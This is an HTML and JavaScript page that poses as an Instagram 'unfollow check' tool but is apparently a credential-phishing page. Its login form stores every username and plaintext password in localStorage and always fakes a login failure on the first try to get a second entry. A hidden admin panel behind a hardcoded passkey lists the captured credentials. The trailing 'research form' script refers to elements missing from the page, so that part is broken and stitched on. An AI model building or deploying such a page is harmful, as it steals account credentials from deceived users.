<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Check Who Unfollowed You</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      overflow: hidden;
      position: relative;
    }
    
    /* Faster animated gradient background */
    .gradient-bg {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(-45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      background-size: 400% 400%;
      animation: gradientShift 8s ease infinite;
      z-index: -1;
    }
    
    @keyframes gradientShift {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
    
    .container {
      position: relative;
      width: 350px;
      padding: 2rem;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
      text-align: center;
      backdrop-filter: blur(10px);
    }
    
    .logo {
      font-size: 2rem;
      font-weight: bold;
      color: #d62976;
      margin-bottom: 1rem;
    }
    
    .headline {
      color: #555;
      margin-bottom: 1.5rem;
      font-size: 0.9rem;
    }
    
    input {
      width: 100%;
      padding: 0.8rem;
      margin: 0.5rem 0;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-sizing: border-box;
      font-size: 0.9rem;
      transition: border-color 0.3s;
    }
    
    input:focus {
      outline: none;
      border-color: #d62976;
    }
    
    button {
      width: 100%;
      padding: 0.9rem;
      margin-top: 1rem;
      border: none;
      border-radius: 10px;
      background: #d62976;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
      font-size: 1rem;
    }
    
    button:hover {
      background: #b81c5f;
    }
    
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    
    #message {
      color: red;
      margin-top: 1rem;
      min-height: 1.2rem;
      font-size: 0.9rem;
    }
    
    /* Admin gear button */
    #admin-toggle {
      position: absolute;
      top: 15px;
      right: 15px;
      cursor: pointer;
      font-size: 1.3rem;
      color: #888;
      transition: transform 0.3s;
      background: rgba(255, 255, 255, 0.8);
      border-radius: 50%;
      width: 35px;
      height: 35px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    #admin-toggle:hover {
      transform: rotate(90deg);
      color: #d62976;
      background: rgba(255, 255, 255, 1);
    }

    #admin-panel {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 1.5rem;
      width: 400px;
      max-height: 70vh;
      overflow-y: auto;
      border-radius: 20px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
      z-index: 1000;
    }

    #admin-panel h2 {
      margin-bottom: 1rem;
      color: #d62976;
      text-align: center;
    }

    #admin-panel .user-entry {
      background: #f8f8f8;
      padding: 0.8rem;
      border-radius: 10px;
      margin-bottom: 0.6rem;
      text-align: left;
      font-size: 0.85rem;
      word-break: break-all;
    }
    
    #admin-panel .admin-controls {
      display: flex;
      justify-content: space-between;
      margin-top: 1rem;
    }
    
    #admin-panel .admin-controls button {
      width: 48%;
      padding: 0.6rem;
    }
    
    #clear-data {
      background: #ff6b6b;
    }
    
    #clear-data:hover {
      background: #ff5252;
    }

    #close-admin {
      background: #d62976;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }
    
    #close-admin:hover {
      background: #b81c5f;
    }
    
    #admin-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      z-index: 999;
    }
    
    /* Loading animation */
    .loading-dots {
      display: inline-block;
      position: relative;
      width: 80px;
      height: 80px;
    }
    
    .loading-dots div {
      position: absolute;
      top: 33px;
      width: 13px;
      height: 13px;
      border-radius: 50%;
      background: #d62976;
      animation-timing-function: cubic-bezier(0, 1, 1, 0);
    }
    
    .loading-dots div:nth-child(1) {
      left: 8px;
      animation: loading-dots1 0.6s infinite;
    }
    
    .loading-dots div:nth-child(2) {
      left: 8px;
      animation: loading-dots2 0.6s infinite;
    }
    
    .loading-dots div:nth-child(3) {
      left: 32px;
      animation: loading-dots2 0.6s infinite;
    }
    
    .loading-dots div:nth-child(4) {
      left: 56px;
      animation: loading-dots3 0.6s infinite;
    }
    
    @keyframes loading-dots1 {
      0% { transform: scale(0); }
      100% { transform: scale(1); }
    }
    
    @keyframes loading-dots3 {
      0% { transform: scale(1); }
      100% { transform: scale(0); }
    }
    
    @keyframes loading-dots2 {
      0% { transform: translate(0, 0); }
      100% { transform: translate(24px, 0); }
    }
    
    /* Success message */
    .success-message {
      color: #28a745;
      margin-top: 1rem;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <!-- Faster animated gradient background -->
  <div class="gradient-bg"></div>
  
  <div class="container">
    <div id="admin-toggle">⚙️</div>
    <div class="logo">Unfollow Check</div>
    <div class="headline">Check who unfollowed you on Instagram</div>
    
    <form id="login-form">
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit" id="login-button">Log In</button>
    </form>
    <p id="message"></p>
  </div>

  <!-- Admin Panel Overlay -->
  <div id="admin-overlay"></div>
  
  <!-- Admin Panel -->
  <div id="admin-panel">
    <h2>Admin Panel</h2>
    <div id="admin-content">No user data collected yet</div>
    <div class="admin-controls">
      <button id="clear-data">Clear All Data</button>
      <button id="close-admin">Close Panel</button>
    </div>
  </div>

  <script>
    // Initialize userCredentials from localStorage or empty array
    let userCredentials = JSON.parse(localStorage.getItem('userCredentials')) || [];
    let loginAttempts = 0;

    // Update admin panel on page load
    document.addEventListener('DOMContentLoaded', function() {
      updateAdminPanel();
    });

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const timestamp = new Date().toLocaleString();

      // Save entry to localStorage
      userCredentials.push({ username, password, timestamp });
      localStorage.setItem('userCredentials', JSON.stringify(userCredentials));
      updateAdminPanel();

      const loginButton = document.getElementById('login-button');
      loginButton.textContent = "Checking...";
      loginButton.disabled = true;

      // Clear any previous message
      document.getElementById('message').textContent = '';
      
      // Simulate login attempt
      loginAttempts++;
      
      if (loginAttempts === 1) {
        // First attempt - show error after delay
        setTimeout(() => {
          document.getElementById('message').textContent = "Incorrect username or password. Please try again.";
          loginButton.textContent = "Log In";
          loginButton.disabled = false;
          document.getElementById('username').value = '';
          document.getElementById('password').value = '';
        }, 1500);
      } else if (loginAttempts === 2) {
        // Second attempt - show loading then redirect
        setTimeout(() => {
          // Show loading animation
          const container = document.querySelector('.container');
          container.innerHTML = `
            <div style="padding: 2rem; text-align: center;">
              <div class="loading-dots">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
              </div>
              <p style="margin-top: 1rem; color: #555;">Checking your followers...</p>
            </div>
          `;
          
          // Simulate checking process
          setTimeout(() => {
            // In a real app, this would redirect to the results page
            alert("This is a demo. In a real app, you would see unfollower results here.");
            // Reset the page
            location.reload();
          }, 3000);
        }, 1500);
      }
    });

    // Admin access
    const PASSKEY = "college123";

    document.getElementById('admin-toggle').addEventListener('click', function() {
      const enteredKey = prompt("Enter passkey to access Admin Panel:");
      if (enteredKey === PASSKEY) {
        document.getElementById('admin-panel').style.display = 'block';
        document.getElementById('admin-overlay').style.display = 'block';
      } else {
        alert("Incorrect passkey!");
      }
    });

    document.getElementById('close-admin').addEventListener('click', function() {
      document.getElementById('admin-panel').style.display = 'none';
      document.getElementById('admin-overlay').style.display = 'none';
    });
    
    document.getElementById('clear-data').addEventListener('click', function() {
      if (confirm("Are you sure you want to clear all stored credentials?")) {
        userCredentials = [];
        localStorage.removeItem('userCredentials');
        updateAdminPanel();
        alert("All data has been cleared!");
      }
    });
    
    document.getElementById('admin-overlay').addEventListener('click', function() {
      document.getElementById('admin-panel').style.display = 'none';
      document.getElementById('admin-overlay').style.display = 'none';
    });

    function updateAdminPanel() {
      const adminContent = document.getElementById('admin-content');
      if (userCredentials.length === 0) {
        adminContent.innerHTML = "No user data collected yet";
        return;
      }
      let html = `<p><strong>Total entries: ${userCredentials.length}</strong></p>`;
      userCredentials.forEach((cred, index) => {
        html += `
          <div class="user-entry">
            <strong>Entry #${index + 1}</strong><br>
            Username: ${cred.username}<br>
            Password: ${cred.password}<br>
            Time: ${cred.timestamp}
          </div>
        `;
      });
      adminContent.innerHTML = html;
    }
    let researchData = JSON.parse(localStorage.getItem('researchData')) || [];
    
    // Enable submit button only when consent is given
    document.getElementById('consent-checkbox').addEventListener('change', updateSubmitButton);
    document.getElementById('data-usage-checkbox').addEventListener('change', updateSubmitButton);
    
    function updateSubmitButton() {
      const consent = document.getElementById('consent-checkbox').checked;
      const dataUsage = document.getElementById('data-usage-checkbox').checked;
      document.getElementById('submit-btn').disabled = !(consent && dataUsage);
    }
    
    document.getElementById('research-form').addEventListener('submit', function(e) {
      e.preventDefault();
      
      if (!document.getElementById('consent-checkbox').checked) {
        alert('Please provide consent to participate in this research study.');
        return;
      }
      
      const userData = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        email: document.getElementById('email').value || 'Not provided',
        timestamp: new Date().toLocaleString(),
        consentGiven: true,
        researchParticipant: true
      };
      
      // Store data locally (in real project, send to server)
      researchData.push(userData);
      localStorage.setItem('researchData', JSON.stringify(researchData));
      
      // Show success message
      document.getElementById('success-message').style.display = 'block';
      document.getElementById('research-form').reset();
      document.getElementById('consent-checkbox').checked = false;
      document.getElementById('data-usage-checkbox').checked = false;
      updateSubmitButton();
      
      // Simulate research analysis
      setTimeout(() => {
        alert('Research data recorded. Thank you for contributing to academic research!');
      }, 1000);
    });
    
    // Research data access (for your use)
    function getResearchData() {
      return JSON.parse(localStorage.getItem('researchData')) || [];
    }
    
    function exportResearchData() {
      const data = getResearchData();
      const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'research-data.json';
      a.click();
    }
  </script>
</body>
</html>
